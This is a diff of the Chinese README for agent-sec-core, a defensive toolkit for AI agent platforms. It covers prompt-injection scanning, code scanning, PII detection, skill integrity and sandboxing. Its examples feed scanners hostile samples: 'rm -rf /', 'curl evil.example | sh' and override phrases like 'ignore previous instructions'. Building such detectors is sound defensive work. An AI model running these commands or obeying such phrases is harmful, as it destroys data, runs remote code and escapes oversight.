@@ -2,7 +2,10 @@
 
 [English](README.md)
 
-**面向 AI Agent 的 OS 级安全内核。** 提供系统加固、资产完整性校验与安全决策的完整防护链，作为所有业务 skill 之上的安全监督层运行，适用于 [ANOLISA](../../README_zh.md)、OpenClaw 等 AI Agent 运行平台。
+**面向 AI Agent 的 OS 级安全内核。** 为 Agent 负载提供纵深防御：提示词注入检测、
+代码扫描、PII 检测、Skill 完整性追踪、系统基线加固、沙箱隔离，以及本地安全事件
+存储。全部本地运行，无 Token 消耗。适用于 [ANOLISA](../../README_zh.md) 等 AI Agent
+运行平台，以及下文列出的六个 Agent 宿主。
 
 ## 背景
 
@@ -13,126 +16,104 @@
 1. **最小权限** — Agent 仅获得完成任务所需的最小系统权限。
 2. **显式授权** — 敏感操作必须经过用户明确确认，禁止静默提权。
 3. **零信任** — Skill 间互不信任，每次操作独立鉴权。
-4. **纵深防御** — 系统加固 → 资产校验 → 安全决策，任一层失守不影响其他层。
+4. **纵深防御** — 执行前预防 → 运行时检测 → 内核级隔离，任一层失守不影响其他层。
 5. **安全优先于执行** — 当安全与功能冲突时，安全优先；存疑时按高风险处理。
+
+## 能力总览
+
+| 模块 | 说明 | CLI 入口 |
+|------|------|----------|
+| **Prompt Scanner** | 提示词注入 / 越狱检测：规则引擎（L1）+ ML 分类器（L2），以及多轮意图检测（L4） | `agent-sec-cli scan-prompt` |
+| **Code Scanner** | 对 bash / python 代码做静态危险操作分析 | `agent-sec-cli scan-code` |
+| **PII Checker** | 个人数据与凭证检测，支持脱敏输出 | `agent-sec-cli scan-pii` |
+| **Skill Ledger** | 基于 Ed25519 签名的 Skill 完整性账本，仅追加版本链 | `agent-sec-cli skill-ledger` |
+| **Security Baseline** | 系统加固扫描与修复（封装 `loongshield seharden`） | `agent-sec-cli harden` |
+| **Observability** | Agent 生命周期事件记录、会话复盘报告、交互式审查 TUI | `agent-sec-cli observability` |
+| **Security Events** | 本地 JSONL + SQLite 事件存储，支持查询与聚合 | `agent-sec-cli events` |
+| **Sandbox** | 系统调用级命令隔离（bubblewrap + seccomp），作为架构层使用 | `linux-sandbox` |
+
+后台守护进程 `agent-sec-daemon`（以 `agent-sec-core.service` systemd **user** unit
+形式发布）提供健康检查、SkillFS 通知和安全查询 RPC。Prompt Scanner 通过 Rust 扩展
+在进程内执行；daemon 不会预加载 Prompt Scanner 模型，也不提供扫描 RPC。
 
 ## 安全防护架构
 
 ```
-┌─────────────────────────────────────────────┐
-│              Agent Application              │
-├──────────────────┬──────────────────────────┤
-│ 安全检查工作流     │  沙箱策略                 │
-│ (agent-sec-cli)  │  (由 agent-sec-cli        │
-│                  │   独立管理)               │
-├──────────────────┴──────────────────────────┤
-│  4. 安全决策流程（风险分级与处置）          │
-├─────────────────────────────────────────────┤
-│  Phase 3: 最终安全确认                       │
-├─────────────────────────────────────────────┤
-│  Phase 2: 关键资产保护 (GPG + SHA-256)       │
-├─────────────────────────────────────────────┤
-│  Phase 1: 系统安全加固 (loongshield)         │
-├─────────────────────────────────────────────┤
-│              Linux Kernel                   │
-└─────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────┐
+│   Agent 宿主：cosh · OpenClaw · Hermes ·                 │
+│               Qwen Code · Qoder · Codex                 │
+├─────────────────────────────────────────────────────────┤
+│   各宿主 Hook：code-scanner · prompt-scanner ·           │
+│           pii-checker · skill-ledger · observability     │
+├──────────────────────────┬──────────────────────────────┤
+│  agent-sec-cli           │  agent-sec-daemon            │
+│  scan-prompt / scan-code │  健康检查 + SkillFS 通知      │
+│  scan-pii / skill-ledger │  安全查询 RPC                 │
+│  harden / verify         │                              │
+│  events / observability  │                              │
+├──────────────────────────┴──────────────────────────────┤
+│  Security Events（JSONL + SQLite）                       │
+├─────────────────────────────────────────────────────────┤
+│  linux-sandbox（bubblewrap + seccomp）                   │
+├─────────────────────────────────────────────────────────┤
+│  Linux Kernel · loongshield 基线                         │
+└─────────────────────────────────────────────────────────┘
 ```
-
-安全检查工作流（Phase 1-3 + 安全决策）由 `agent-sec-cli` 提供，各阶段通过独立 CLI 子命令调用。
-
-## 安全检查工作流
-
-每次 Agent 执行前，按顺序完成以下安全检查（Phase 1-3），**全部通过后才允许进入安全决策流程**。
-
-| 阶段 | 说明 | 入口 | 通过条件 |
-|------|------|------|----------|
-| **Phase 1** | 系统安全加固 — `loongshield seharden --scan --config agentos_baseline` | `agent-sec-cli harden --scan` | 输出包含 `结果：合规` |
-| **Phase 2** | 关键资产保护 — GPG 签名 + SHA-256 哈希校验所有 skill | `agent-sec-cli verify` | 输出包含 `VERIFICATION PASSED` |
-| **Phase 3** | 最终安全确认 — 重新执行 Phase 1 scan + Phase 2 verify 作为复检 | 重新调用上述命令 | 复检全部通过 |
-
-任一 Phase 未通过，后续 Phase 全部取消，Agent 执行被阻断。
-
-## 风险分级与处置
-
-| 风险等级 | 典型场景 | 处置策略 |
-|---------|---------|---------|
-| **低** | 文件读取、信息查询、文本处理 | 允许，沙箱内执行 |
-| **中** | 代码执行、包安装、调用外部 API | 沙箱隔离 + 用户确认 |
-| **高** | 读取 `.env`/SSH 密钥、数据外发、修改系统配置 | 阻断，除非用户显式批准 |
-| **危急** | Prompt injection、secret 外泄、禁用安全策略 | 立即阻断 + 审计日志 + 通知用户 |
-
-**存疑时，按高风险处理。**
-
-## 受保护资产
-
-### 系统凭证
-
-绝不允许 Agent 访问或外传：
-
-- SSH 密钥（`/etc/ssh/`、`~/.ssh/`）
-- GPG 私钥
-- API tokens / OAuth credentials
-- 数据库凭证
-- `/etc/shadow`、`/etc/gshadow`
-- 主机标识信息（IP、MAC、`hostname`）
-
-### 系统关键文件
-
-以下路径受写保护：
-
-- `/etc/passwd`、`/etc/shadow`、`/etc/sudoers`
-- `/etc/ssh/sshd_config`、`/etc/pam.d/`、`/etc/security/`
-- `/etc/sysctl.conf`、`/etc/sysctl.d/`
-- `/boot/`、`/usr/lib/systemd/`、`/etc/systemd/system/`
-
-## 沙箱策略模板
-
-`linux-sandbox` 提供 3 种内置策略模板：
-
-| 模板 | 文件系统 | 网络 | 使用场景 |
-|------|---------|------|---------|
-| **read-only** | 全盘只读 | 禁止 | 只读操作：`ls`、`cat`、`grep`、`git status` 等 |
-| **workspace-write** | cwd + /tmp 可写，其余只读 | 禁止 | 构建、编辑、脚本执行等需要写文件的操作 |
-| **danger-full-access** | 无限制 | 允许 | ⚠ 保留模板，仅供特殊场景手动指定 |
-
-命令分类直接映射沙箱模式：
-
-| 分类 | 沙箱模式 | 说明 |
-|------|---------|------|
-| `destructive` | ❌ 拒绝执行 | 危险命令，直接拒绝 |
-| `dangerous` | workspace-write | 高风险操作，不允许额外补权限 |
-| `safe` | read-only | 只读操作，无需补权限 |
-| `default` | workspace-write | 常规操作，可按需补网络/写路径 |
 
 ## 项目结构
 
 ```
 agent-sec-core/
 ├── linux-sandbox/             # Rust 沙箱执行器（bubblewrap + seccomp）
-│   ├── src/                   # Rust 源码（cli, policy, seccomp, proxy, …）
-│   ├── tests/                 # Rust 集成测试 + Python e2e
+│   ├── src/                   # Rust 源码（cli, policy, seccomp, bwrap_args, …）
+│   ├── tests/                 # Rust 集成测试
 │   └── docs/                  # dev-guide, user-guide
-├── agent-sec-cli/             # 统一 CLI + 安全中间层（Python）
+├── agent-sec-cli/             # 统一 CLI + 安全中间层（Python + Rust 扩展）
 │   ├── src/agent_sec_cli/     # 主 Python 包
 │   │   ├── cli.py             # CLI 入口点（Typer）
-│   │   ├── asset_verify/      # Skill 签名 + 哈希校验
-│   │   ├── code_scanner/      # 代码安全扫描引擎
-│   │   ├── sandbox/           # 沙箱策略生成
-│   │   ├── skill_ledger/      # Ed25519 完整性账本（check/certify/status）
-│   │   ├── security_events/   # JSONL 事件日志
-│   │   └── security_middleware/ # 中间层 + 后端实现
+│   │   ├── asset_verify/      # Skill GPG 签名 + 哈希校验
+│   │   ├── code_scanner/      # 代码扫描引擎（regex + llm）与规则集
+│   │   ├── prompt_scanner/    # 提示词注入 / 越狱扫描器
+│   │   ├── pii_checker/       # PII 与凭证检测
+│   │   ├── skill_ledger/      # Ed25519 完整性账本与内置扫描器
+│   │   ├── sandbox/           # 命令分类 + 沙箱策略生成
+│   │   ├── observability/     # Observability 记录、report、审查 TUI
+│   │   ├── security_events/   # JSONL + SQLite 事件存储
+│   │   ├── security_middleware/ # 中间层 + 后端实现
+│   │   ├── daemon/            # agent-sec-daemon 服务端与客户端
+│   │   ├── model_service/     # 本地模型后端（如 Ollama）
+│   │   └── telemetry/         # Telemetry schema 与写入器
 │   ├── dev-tools/             # 后端扩展开发指南
 │   └── pyproject.toml         # 构建配置
-├── qwen-code-extension/       # Qwen Code PII 策略与 Observability hooks
-├── skills/                    # 安全相关 skill 集合（skill-ledger、code-scanner、prompt-scanner 等）
+├── cosh-extension/            # Copilot Shell hooks + 沙箱 guard
+├── openclaw-plugin/           # OpenClaw 插件（TypeScript）
+├── hermes-plugin/             # Hermes 插件（Python capabilities）
+├── qwen-code-extension/       # Qwen Code hooks
+├── qoder-plugin/              # Qoder CLI hooks
+├── codex-plugin/              # Codex hooks
+├── skills/                    # 安全 skill：code-scanner、prompt-scanner、skill-ledger
 ├── tools/                     # sign-skill.sh — PGP 技能签名工具
-├── tests/                     # 单元测试、集成测试、端到端测试
+├── packaging/                 # raw 包构建 + systemd unit 模板
+├── scripts/                   # CLI/daemon wrapper 与 CI 辅助脚本
+├── docs/design/               # 设计文档
+├── tests/                     # 单元测试、集成测试、打包测试、端到端测试
+├── .anolisa/component.toml    # ANOLISA 组件契约
 ├── LICENSE
 ├── Makefile
-├── agent-sec-core.spec        # RPM 打包 spec
+├── agent-sec-core.spec.in     # RPM 打包 spec 模板
 ├── README.md
 └── README_zh.md
 ```
+
+六个 Agent 宿主均已实现全部五类 hook（code-scanner、prompt-scanner、pii-checker、
+skill-ledger、observability）；各宿主支持的处置模式不同，见
+[Agent Hook 环境变量](#agent-hook-环境变量)。
+
+各 adapter 专项说明：
+[OpenClaw](openclaw-plugin/README.md) ·
+[Hermes](hermes-plugin/README.md) ·
+[Codex](codex-plugin/README.md) ·
+[Qwen Code](qwen-code-extension/README.md)
 
 ## Observability Hook 配置
 
@@ -161,11 +142,13 @@ capability。
 | 组件 | 要求 |
 |------|------|
 | **操作系统** | Alibaba Cloud Linux / Anolis / RHEL 系列 |
-| **权限** | root 或 sudo |
-| **loongshield** | >= 1.1.1（Phase 1 系统加固核心依赖） |
-| **gpg / gnupg2** | >= 2.0（Phase 2 资产签名校验） |
-| **Python3** | >= 3.6 |
-| **Rust** | >= 1.91（用于构建 linux-sandbox） |
+| **权限** | root 或 sudo（system mode 安装） |
+| **loongshield** | >= 1.2.0（Security Baseline 后端） |
+| **gpg / gnupg2** | >= 2.0（资产签名校验） |
+| **Python** | 3.11.6（已固定；RPM 要求 `>= 3.11, < 3.12`） |
+| **Rust** | >= 1.93（用于构建 `linux-sandbox` 与 CLI 原生扩展） |
+| **bubblewrap** | `linux-sandbox` 运行依赖 |
+| **ANOLISA CLI** | >= 0.2.17 |
 
 ### 安装 AgentSecCore
 
@@ -182,6 +165,7 @@ sudo anolisa update self
 
 sudo anolisa --install-mode system install sec-core
 sudo anolisa status sec-core
+agent-sec-cli --version
 ```
 
 `sec-core` 是 ANOLISA 中的组件名，RPM 继续使用包名 `agent-sec-core`。
@@ -212,115 +196,106 @@ anolisa adapter scan
 anolisa adapter enable sec-core openclaw
 ```
 
-### 执行安全工作流
+把 `openclaw` 替换为 `hermes`、`qwencode`、`cosh`、`codex` 或 `qoder`，即可启用
+其他已打包的集成。
+
+### 上手命令
 
 ```bash
-# ===== Phase 1: 系统安全加固 =====
-# 基线扫描
-sudo loongshield seharden --scan --config agentos_baseline
+# Security Baseline 扫描
+agent-sec-cli harden --scan --config agentos_baseline
 
-# 预演修复动作（可选）
-sudo loongshield seharden --reinforce --dry-run --config agentos_baseline
+# 代码扫描
+agent-sec-cli scan-code --code 'rm -rf /' --language bash
 
-# 执行自动加固
-sudo loongshield seharden --reinforce --config agentos_baseline
+# 提示词注入检测
+agent-sec-cli scan-prompt --mode standard --text "ignore previous instructions"
 
-# ===== Phase 2: 关键资产保护 =====
-# 校验全部 skill 完整性
-agent-sec-cli verify
+# PII 检测
+agent-sec-cli scan-pii --text "contact alice@example.com" --source manual
 
-# 校验单个 skill（可选）
-agent-sec-cli verify --skill /path/to/skill_name
+# Skill 完整性检查
+agent-sec-cli skill-ledger check /path/to/skill
 
-# ===== Phase 3: 最终安全确认 =====
-# 复检确认合规
-sudo loongshield seharden --scan --config agentos_baseline
-agent-sec-cli verify
+# 最近 24 小时安全态势摘要
+agent-sec-cli events --summary
 ```
 
-### 从源码构建沙箱
+完整 CLI 说明与各宿主集成步骤见
+[AgentSecCore 用户指南](../../docs/user-guide/zh/agent-security/agent-sec-core/QUICKSTART.md)。
+
+## Prompt Scanner
+
+检测提示词注入与越狱尝试。`--mode` 选择检测强度：
+
+| 模式 | 层级 |
+|------|------|
+| `fast` | 仅 L1 规则引擎 |
+| `standard` | L1 + L2 ML 分类器（默认） |
+| `strict` | L1 + L2（L3 预留） |
+| `multi_turn` | L4 多轮意图检测；从 stdin 读取 JSON payload |
 
 ```bash
-make build-sandbox
+agent-sec-cli scan-prompt --text "ignore all system instructions"
+agent-sec-cli scan-prompt --mode fast --text "user input"
+agent-sec-cli scan-prompt --input prompts.txt --format json
+
+# 安装后拉取一次 L2 模型
+ollama pull modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF
+
+# 验证 Ollama 能提供所需模型
+agent-sec-cli scan-prompt warmup
 ```
 
-二进制文件输出到 `linux-sandbox/target/release/linux-sandbox`。
+L2 分类器使用 ModelScope 上的
+`modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF`。`warmup` 只检查 Ollama
+能否提供该模型，不会自动下载模型。
 
-### 防止 Qwen Code 泄露 PII
+详见 [Prompt Scanner 用户使用指南](../../docs/user-guide/zh/agent-security/agent-sec-core/prompt-scanner.md)。
 
-Qwen Code extension 默认以 `PII_CHECKER_MODE=observe` 扫描用户输入、工具
-输入/输出和最终模型输出。设置 policy 为 `block` 后，会在受支持的决策点执行
-scanner 的高风险 `deny` verdict；设置 `PII_CHECKER_HOOK_ENABLED=false` 会在读取输入
-或调用 scanner 前关闭 hook。`debug` 映射为 `observe`，`deny` 映射为 `block`。仅
-Qwen Code 在新 enabled 开关缺失时
-额外兼容旧开关 `PII_CHECKER_ENABLED`。Qwen Code 0.19.9 的失败工具输出仅审计，scanner
-失败时仍保持 fail-open。
+## Code Scanner
+
+扫描 bash 与 python 源码中的危险操作。verdict 枚举为 `pass` / `warn` / `deny` /
+`error`；内置规则当前只产出 `warn` 或 `pass`。
 
 ```bash
-anolisa adapter enable sec-core qwencode
-PII_CHECKER_MODE=block qwen
+# regex 引擎（默认）
+agent-sec-cli scan-code --code 'rm -rf /'
+agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python
+
+# LLM 引擎（需要已配置的模型后端）
+agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
 ```
 
-配置项及工具/模型后置输出的阻断边界见
-[Qwen Code extension 指南](qwen-code-extension/README.md)。
+规则位于 `agent-sec-cli/src/agent_sec_cli/code_scanner/rules/{bash,python}/`。
+bash 与 python 规则集共享核心系统凭证和配置路径，例如 `/etc/shadow`、`/etc/sudoers`、
+`/etc/pam.d/`、`/etc/sysctl.d/`、`/boot/` 和 `/usr/lib/systemd/`。bash 额外覆盖
+shell 历史和集群凭证模式，例如 `/etc/kubernetes/` 与 `kubeconfig`；Python 的路径清单
+更窄。这些路径用于产生扫描器 finding，并非内核强制的写保护。
 
-### 生成沙箱策略
+各宿主 hook 模式见 [Code Scanner Hook 配置](../../docs/user-guide/zh/agent-security/agent-sec-core/code-scanner.md)。
 
-对命令进行安全分类，生成 `linux-sandbox` 执行策略：
+## PII Checker
+
+检测个人数据与凭证，可输出脱敏文本。
 
 ```bash
-python3 agent-sec-cli/src/agent_sec_cli/sandbox/sandbox_policy.py --cwd "$PWD" "git status"
+agent-sec-cli scan-pii --text "contact alice@example.com" --source manual
+echo "my key is AKID1234567890" | agent-sec-cli scan-pii --stdin --format json
+agent-sec-cli scan-pii --text "card 4111111111111111" --redact-output
+agent-sec-cli scan-pii --input ./sample.log --include-low-confidence
 ```
 
-输出示例：
-```json
-{
-  "decision": "sandbox",
-  "classification": "safe",
-  "sandbox_mode": "read-only",
-  "sandbox_command": "linux-sandbox --sandbox-policy-cwd ... -- git status"
-}
-```
+可在 `~/.config/agent-sec/pii-checker/rules.yaml` 中添加自定义业务类型。
 
-## 资产完整性校验
-
-### 校验流程
-
-1. 加载受信公钥（`agent_sec_cli/asset_verify/trusted-keys/*.asc`）
-2. 验证 Skill 目录中 `.skill-meta/Manifest.json` 的 GPG 签名（`.skill-meta/.skill.sig`）
-3. 校验 Manifest 中所有文件的 SHA-256 哈希
-
-### 错误码
-
-| 码 | 含义 |
-|----|------|
-| 0 | 通过 |
-| 10 | 缺失 `.skill-meta/.skill.sig` |
-| 11 | 缺失 `.skill-meta/Manifest.json` |
-| 12 | 签名无效 |
-| 13 | 哈希不匹配 |
-
-### Skill 签名（自行部署快速开始）
-
-通过源码部署时，skill 默认未签名。签名后 Phase 2 才能通过：
-
-```bash
-# 1. 一次性初始化：生成 GPG 密钥 + 导出公钥
-tools/sign-skill.sh --init
-
-# 2. 批量签名所有 skill
-tools/sign-skill.sh --batch /usr/share/anolisa/skills --force
-
-# 3. 验证
-agent-sec-cli verify
-```
-
-完整指南（手动密钥管理、自定义 skill、CI/CD、问题排查）请参见 **[Skill 签名指南](tools/SIGNING_GUIDE_zh.md)**。
+详见 [PII Checker 用户使用指南](../../docs/user-guide/zh/agent-security/agent-sec-core/pii-checker.md)。
 
 ## Skill Ledger
 
 基于 Ed25519 的 Skill 目录完整性账本。在 `.skill-meta/` 中记录文件哈希、版本链和扫描结果，通过 `agent-sec-cli skill-ledger` 子命令统一管理。
 对于已有 manifest，Skill Ledger 会先验真、再检查文件漂移；已有但未签名的 manifest 会报告为 `tampered`。
+
+六种完整性状态为 `pass` / `none` / `drifted` / `warn` / `deny` / `tampered`。
 
 ### 核心命令
 
@@ -332,8 +307,9 @@ agent-sec-cli verify
 | `check <dir>` | 检测 Skill 文件是否漂移或被篡改 |
 | `show <dir>` | 展示 latest/active 暴露摘要、用户决策、告警信息和 findings |
 | `export <dir> --version latest --output <path>` | 导出签名 snapshot、manifest 和 findings 供审查 |
-| `decide <dir> --action allow|always_allow|block|rollback` | 记录用户决策并刷新 activation |
+| `decide <dir> --action allow\|always_allow\|block\|rollback` | 记录用户决策并刷新 activation |
 | `certify <dir> --findings <file>` | 导入外部扫描结果并签名写入 manifest |
+| `list-scanners` | 列出已注册的内置扫描器 |
 | `status` | 系统级健康概览（密钥、配置、聚合完整性） |
 | `audit <dir>` | 查看版本历史与签名链 |
 | `check --all` / `scan --all` | 对所有已注册 Skill 目录批量执行 |
@@ -420,28 +396,81 @@ agent-sec-cli capabilities --agent hermes --capability pii-check --output json
 
 表格输出仅包含稳定的用户可见列：`CAPABILITY`、`ENABLED`、`MODE`、`SCAN_MODE`、`TIMEOUT(s)` 和 `DIAGNOSTICS`。JSON 输出保留同样的用户字段，并额外包含经过脱敏投影的 `env` 条目，其中只含 `effective` 和 `default`。两种格式都不会暴露 hook matcher 列表、source 标签、Agent config 内容、config 路径或原始环境变量值。诊断信息只说明哪个设置无效及 fallback 行为，不回显原始值。
 
-## 审计日志
+## Security Baseline
 
-所有安全事件以 JSONL 格式记录至 `/var/log/agent-sec/security-events.jsonl`（回退路径：`~/.agent-sec-core/security-events.jsonl`）：
+`agent-sec-cli harden` 封装 `loongshield seharden`；当未指定动作或 profile 时，
+默认补齐 `--scan --config agentos_baseline`。
 
-```json
-{"event_id": "uuid", "event_type": "harden", "category": "hardening", "timestamp": "ISO-8601", "trace_id": "uuid", "pid": 1234, "uid": 0, "details": {"request": {...}, "result": {...}}}
+```bash
+# 合规扫描
+agent-sec-cli harden --scan --config agentos_baseline
+
+# 预演修复动作
+agent-sec-cli harden --reinforce --dry-run --config agentos_baseline
+
+# 执行修复（需要 root）
+sudo agent-sec-cli harden --reinforce --config agentos_baseline
+
+# 查看完整的下游 loongshield 帮助
+agent-sec-cli harden --downstream-help
 ```
+
+## Observability
+
+```bash
+# 交互式下钻 TUI（需要交互式终端）
+agent-sec-cli observability review
+
+# 单会话复盘报告
+agent-sec-cli observability report --last
+agent-sec-cli observability report --session-id <id> --format json
+
+# 打印公开的 observability record JSON Schema
+agent-sec-cli observability schema
+```
+
+详见 [Observability 用户指南](../../docs/user-guide/zh/agent-security/agent-sec-core/QUICKSTART.md#observability可观测)。
+
+## Security Events
+
+安全事件会同时写入 JSONL 与 SQLite 存储。使用 `agent-sec-cli events` 查询该存储：
+
+```bash
+agent-sec-cli events --last-hours 24
+agent-sec-cli events --category prompt_scan --output json
+agent-sec-cli events --count-by category --last-hours 24
+agent-sec-cli events --summary
+```
+
+详见 [Security Events 用户指南](../../docs/user-guide/zh/agent-security/agent-sec-core/QUICKSTART.md#security-events安全事件)。
+
+## Agent Hook 环境变量
+
+宿主 hook 矩阵由用户指南维护，以保持环境变量和宿主 mode 语义只有一个权威来源：
+[Agent Hook 环境变量](../../docs/user-guide/zh/agent-security/agent-sec-core/QUICKSTART.md#agent-hook-环境变量)。
 
 ## 开发
 
 ```bash
-# 构建沙箱
+# 构建全部组件（沙箱、CLI wheel、所有 adapter、skills、组件清单）
+make build-all
+
+# 单独构建
 make build-sandbox
+make build-cli
 
-# 运行 Rust 测试
-cd linux-sandbox && cargo test
+# 测试
+make test               # Python + Rust 沙箱 + OpenClaw 插件
+make test-python
+make test-rust
+make test-openclaw-plugin
 
-# 运行端到端测试（需先安装沙箱）
-python3 tests/e2e/linux-sandbox/e2e_test.py
-
-# 格式化 Python 代码
+# Lint 与格式化
+make python-lint
 make python-code-pretty
+
+# 查看全部 target
+make help
 ```
 
 ## 许可证
